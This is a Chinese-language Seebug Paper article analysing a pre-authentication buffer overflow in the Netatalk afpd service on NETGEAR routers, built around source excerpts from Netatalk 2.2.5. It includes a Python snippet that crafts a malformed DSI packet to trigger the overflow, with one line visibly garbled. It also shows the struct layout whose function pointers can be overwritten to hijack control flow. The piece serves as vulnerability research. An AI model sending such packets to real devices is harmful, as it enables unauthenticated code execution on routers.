**作者：cq674350529  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
### 前言
2022年11月，`SSD`发布了一个与`NETGEAR R7800`型号设备相关的[漏洞公告](https://ssd-disclosure.com/ssd-advisory-netgear-r7800-afpd-preauth/)。根据该公告，该漏洞存在于`Netatalk`组件(对应的服务程序为`afpd`)中，由于在处理接收的`DSI`数据包时，缺乏对数据包中某些字段的适当校验，在`dsi_writeinit()`中调用`memcpy()`时存在缓冲区溢出问题。利用该漏洞，攻击者可以在目标设备上实现任意代码执行，且无需认证。该漏洞公告中包含了漏洞的细节以及利用思路，但给出的`poc`脚本仅实现了控制流的劫持，缺少后续代码执行的部分。下面将基于`R8500`型号设备，对漏洞进行简单分析，并给出具体的利用方式。
### 漏洞分析
`Netatalk`组件在很多`NAS`设备或小型路由器设备中都有应用，近几年吸引了很多安全研究人员的关注，陆续被发现存在多个高危漏洞，例如在近几年的Pwn2Own比赛中，好几个厂商的设备由于使用了该组件而被攻破，`NETGEAR`厂商的部分路由器设备也不例外。
> `NETGEAR`厂商的很多路由器中使用的是很老版本的`Netatalk`组件
该公告中受影响的目标设备为`R7800 V1.0.2.90`版本，而我手边有一个`R8500`型号的设备，在`R8500
V1.0.2.160`版本中去掉了该组件，因此将基于`R8500
V1.0.2.154`版本进行分析。在`NETGEAR`厂商的[GPL页面](https://kb.netgear.com/2649/NETGEAR-Open-Source-Code-for-Programmers-GPL)，下载对应设备版本的源代码，其中包含`Netatalk`组件的源码，可以直接结合源码进行分析。以`R8500
V1.0.2.154`版本为例，其包含的`Netatalk`组件的版本为`2.2.5`，而该版本发布的时间在2013年，为一个很老的版本。
`AFP`协议建立在[`Data Stream
Interface(DSI)`](https://en.wikipedia.org/wiki/Data_Stream_Interface)之上，`DSI`是一个会话层，用于在`TCP`层上承载`AFP`协议的流量。在正常访问该服务时，大概的协议交互流程如下。
![
](https://images.seebug.org/content/images/2023/02/14174a52-ccf3-4a2b-bd33-7cee59bd77c0.png-w331s)
其中，
在`DSIOpenSession`请求执行成功后，后续将发送`DSICommand`请求，而处理该请求的代码存在于`afp_over_dsi()`中，部分代码片段如下。正常情况下，程序会在`(1)`处读取对应的请求数据包，之后在`(2)`处根据`cmd`的取值进入不同的处理分支。
    void afp_over_dsi(AFPObj *obj)
    {
        /* ... */
        /* get stuck here until the end */
        while (1) {
            /* Blocking read on the network socket */
            cmd = dsi_stream_receive(dsi);   // (1)
            /* ... */
            switch(cmd) {   // (2)
                case DSIFUNC_CLOSE:
                    /* ...*/
                case DSIFUNC_TICKLE:
                    /* ... */
                case DSIFUNC_CMD:
                    /* ... */
                case DSIFUNC_WRITE:
                    /* ... */
                case DSIFUNC_ATTN:
                    /* ... */
                default:
                    LOG(log_info, logtype_afpd,"afp_dsi: spurious command %d", cmd);
                    dsi_writeinit(dsi, dsi->data, DSI_DATASIZ);  // (3)
                    /* ... */
函数`dsi_stream_receive()`的部分代码如下。可以看到，其会读取请求包中的数据，并保存到`dsi->header`和`dsi->commands`等中。
    int dsi_stream_receive(DSI *dsi)
    {
      /* ... */
      /* read in the header */
      if (dsi_buffered_stream_read(dsi, (u_int8_t *)block, sizeof(block)) != sizeof(block)) 
        return 0;
      dsi->header.dsi_flags = block[0];
      dsi->header.dsi_command = block[1];
      /* ... */
      memcpy(&dsi->header.dsi_requestID, block + 2, sizeof(dsi->header.dsi_requestID));
      memcpy(&dsi->header.dsi_code, block + 4, sizeof(dsi->header.dsi_code));
      memcpy(&dsi->header.dsi_len, block + 8, sizeof(dsi->header.dsi_len));
      memcpy(&dsi->header.dsi_reserved, block + 12, sizeof(dsi->header.dsi_reserved));
      dsi->clientID = ntohs(dsi->header.dsi_requestID);
      /* make sure we don't over-write our buffers. */
      dsi->cmdlen = min(ntohl(dsi->header.dsi_len), DSI_CMDSIZ);
      if (dsi_stream_read(dsi, dsi->commands, dsi->cmdlen) != dsi->cmdlen) 
        return 0;
      /* ... */
在`afp_over_dsi()`中，在`(2)`处，如果`cmd`的取值不满足对应的条件，将会进入`default`分支，`dsi_writeinit()`函数将在`(3)`处被调用。函数`dsi_writeinit()`的部分代码如下。在该函数中，会根据`dsi->header.dsi_code`和`dsi->header.dsi_len`等字段来计算`dsi->datasize`，若其满足条件，则会在`(4)`处调用`memcpy()`。其中，`len`参数与`sizeof(dsi->commands)
- header` 和 `dsi->datasize`等相关。
    size_t dsi_writeinit(DSI *dsi, void *buf, const size_t buflen _U_)
    {
      size_t len, header;
      /* figure out how much data we have. do a couple checks for 0 
       * data */
      header = ntohl(dsi->header.dsi_code);
      dsi->datasize = header ? ntohl(dsi->header.dsi_len) - header : 0;
      if (dsi->datasize > 0) {
        len = MIN(sizeof(dsi->commands) - header, dsi->datasize);
        /* write last part of command buffer into buf */
        memcpy(buf, dsi->commands + header, len);    // (4) buffer overflow
        /* .. */
根据前面`dsi_stream_receive()`的代码可知，`dsi->header.dsi_code`和`dsi->header.dsi_len`字段的值来自于接收的数据包，`dsi->commands`中的内容也来自于接收的数据包。也就是说，在调用`memcpy()`时，源缓冲区中保存的内容和待拷贝的长度参数均是用户可控的，而目标缓冲区`buf`即`dsi->data`的大小是固定的。因此，通过精心伪造一个数据包，可造成在调用`memcpy()`时出现缓冲区溢出，如下。
    def create_block(command, dsi_code, dsi_len):
        block = b'\x00'                             # dsi->header.dsi_flags
        block += struct.pack("header.dsi_command
        block += b'\x00\x00'                        # dsi->header.dsi_requestID
        block += struct.pack(">I", dsi_code)        # dsi->header.dsi_code
        block += struct.pack(">I", dsi_len)         # dsi->header.dsi_len
        block += b'\x00\x00\x00\x00'                # dsi->header.dsi_reserved
        return block
    pkt = create_block(0xFF, 0xFFFFFFFF - 0x50, 0x2001 + 0x20)
    pkt += b'A' * 8192
### 漏洞利用
首先，看一下`DSI`结构体的定义， 如下。`dsi->data`的大小为`8192`，在发生溢出后，其后面的字段也会被覆盖，
包括`proto_open`和`proto_close`两个函数指针。因此，如果溢出后，后面的流程中会用到某个函数指针，就可以实现控制流劫持的目的。
    #define DSI_CMDSIZ        8192 
    #define DSI_DATASIZ       8192
    typedef struct DSI {
      /* ... */
      u_int32_t attn_quantum, datasize, server_quantum;
      u_int16_t serverID, clientID;
      char      *status;
      u_int8_t  commands[DSI_CMDSIZ], data[DSI_DATASIZ];
      size_t statuslen;
      size_t datalen, cmdlen;
      off_t  read_count, write_count;
      uint32_t flags;             /* DSI flags like DSI_SLEEPING, DSI_DISCONNECTED */
      const char *program; 
      int socket, serversock;
      /* protocol specific open/close, send/receive
       * send/receive fill in the header and use dsi->commands.
       * write/read just write/read data */
      pid_t  (*proto_open)(struct DSI *);
      void   (*proto_close)(struct DSI *);
      /* ... */
    } DSI;